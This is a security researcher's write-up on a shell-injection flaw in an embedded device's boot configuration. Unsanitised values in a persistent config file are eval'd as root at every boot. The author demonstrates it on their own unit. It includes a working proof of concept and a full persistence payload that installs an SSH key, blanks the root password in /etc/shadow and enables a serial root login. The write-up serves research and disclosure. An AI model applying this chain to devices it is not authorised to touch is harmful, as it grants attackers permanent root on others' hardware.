# Persistent root on the base — config injection via `eval $(config-setenv)`

> **Ethical note:** demonstrated on the author's own unit, to document the
> weakness and to keep control of the device (e.g. diagnostics, anti-e-waste).
> The same chain gives anyone with one-time serial access permanent root.

## 1. TL;DR

`/etc/on.boot/50_set_kernel_params` runs `eval $(config-setenv)`. `config-setenv`
(Jim Tcl) renders the **persistent** config file `/settings/system.conf`
(partition mtd1, jffs2) as `config_key="value"` lines, and **no stage sanitizes
the values**. A value containing backticks is executed as shell **by root at
every boot**. The boot chain itself (RSA-signed + AES-encrypted) is never touched.

```
/settings/system.conf  (persistent, survives official updates — update_os.sh flashes only mtd0)
  ↓ 15_init_config:  ln -s /settings/system.conf /etc/system.conf
  ↓ config-setenv (Jim Tcl):  prints config_usb_kmem="0`payload`"
  ↓ 50_set_kernel_params:  eval $(config-setenv)   ← code runs as root
  ↓ (later, harmless) 80_update_system_conf — validates only 4 keys, file left intact
```

## 2. The chain, piece by piece

1. **`/etc/on.boot/50_set_kernel_params`** — `eval $(config-setenv)` followed by
   `echo $config_usb_kmem >/sys/module/usbcore/parameters/usbfs_memory_mb`.
2. **`/usr/bin/config-setenv`** (jimsh) — `config_flatten [config_load ...]` then
   prints `config_<key>="<value>"`. Values land **inside double quotes**, but in
   POSIX shell backticks and `$( )` inside double quotes are still executed by
   `eval` — no quote escape needed.
3. **`/usr/lib/jim/config.tcl`** — value = everything after the first `=` to end
   of line, `subst -noc -nov` (Tcl commands/vars off; **shell metacharacters pass
   through raw**). Avoid backslashes in the payload (the parser processes `\\`).
   `config_load` merges defaults + factory + hardware + user.conf +
   `/settings/system.conf` (the last one **wins**); the `[base]` section overrides
   `[default]`.
4. **Guardian `20_sanitise_user_conf`** (`sanitise-user-conf`) — whitelists keys of
   **user.conf only**; never touches system.conf.
5. **Guardian `80_update_system_conf`** (`update-system-conf -init`) — validates
   the **values of only 4 keys** (`usb`, `bridge`, `bridge_protocol`, `hw_type`);
   `usb_kmem` and all other knobs pass unchecked. on.boot runs in lexical order,
   so the eval (50) fires **before** the guardian (80) anyway. Keep the INI
   parseable or the file is moved to `system.conf.invalid`.

## 3. Proof of concept (done, 2026-10-19)

```sh
# one-time access: U-Boot flood → root shell in RAM (see HARDWARE_ACCESS.md), then:
mount -t proc proc /proc; mount -t sysfs sys /sys; mount -t devtmpfs dev /dev
mkdir -p /settings && mount -t jffs2 /dev/mtdblock1 /settings
echo 'usb_kmem=0`date >> /settings/pwn.log`' >> /settings/system.conf
```

Result: after two normal (non-flooded) reboots, `/settings/pwn.log` contained two
lines — **two normal boots executed our code as root**. The value stays `"0"`
(output redirected to the file), so `usbfs_memory_mb` gets a legitimate value and
there is zero functional impact.

## 4. Final payload (verified design)

```sh
cat > /settings/pwn.sh << 'EOF'
#!/bin/sh
date >> /settings/pwn.log
mkdir -p /root/.ssh
echo "ssh-ed25519 <PUBLIC_KEY> user@host" > /root/.ssh/authorized_keys
chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys
sed -i 's/^root:[^:]*:/root::/' /etc/shadow
mkdir -p /etc/systemd/system/getty.target.wants
ln -sf /lib/systemd/system/serial-getty@.service /etc/systemd/system/getty.target.wants/serial-getty@ttyPS0.service
EOF
chmod +x /settings/pwn.sh
sed -i 's/^usb_kmem.*/usb_kmem=0`\/settings\/pwn.sh`/' /settings/system.conf
```

Every normal boot then yields: `ssh root@192.168.3.1` over the USB network
(dropbear reads authorized_keys at auth time) and a root login on the serial
console with a single Enter (the vendor masks `serial-getty@ttyPS0`; pwn.sh
unmasks it — see HARDWARE_ACCESS.md §4).

## 5. Operational notes / pitfalls

- The rootfs is an **initramfs in RAM**: changes under `/etc` die at power-off;
  the payload re-applies them at every boot by design.
- Kernel `console_loglevel` is very low (lowered by "Apply Kernel Variables"
  before the hooks): markers written to `/dev/kmsg` land in dmesg but **not** on
  the serial console — use **file markers**, never kmsg markers.
- No RTC: the clock restarts from a default at each boot (timestamps in pwn.log
  are relative, ~41–45 s after power-on = hook 50).
- Factory `system.conf` contains only the overrides (e.g. `[base]` with
  `imr_controller_log_level=1`, `wi_channel=-1`, `wi_country=IT`); append new keys
  there — `[base]` wins over `[default]`.
- dropbear starts in on.earlyboot (before the payload): if root SSH is refused
  (flag `-w`), pwn.sh can `systemctl restart dropbear` (systemd is already up at
  hook 50).
- Boot order: on.earlyboot → systemd → `IMR Boot Setup` (run-parts on.boot):
  15_init_config → 20_sanitise_user_conf → **50_set_kernel_params (payload)** →
  80_update_system_conf → 99_dmesg_dump.

## 6. Related open leads

- **TCP 34566** (`imr_controller`, messages `Setup.UpdateUserConf`/`SystemConf`):
  if it accepts config writes over the USB network (192.168.3.1), system.conf
  could be modified **remotely, without any serial ritual** — untested.
- `support-report` / `support-report-zip` (`/bin/support-report`): diagnostic
  bundle that includes the boot log — possible read channel for normal boots.
- **GPL request** to support.nofio.co for the exact kernel/U-Boot/Buildroot
  sources (version string in the rootfs:
  `nofio1-release-v2-5-0-build-02-PRODUCTION_AND_USER_FINAL-nofio1-250520`) —
  GPL-2.0 §3 obliges delivery of corresponding source on request; no public
  Nofio kernel exists. The FPGA bitstream and SP/MCU firmware are **not** GPL-
  covered.
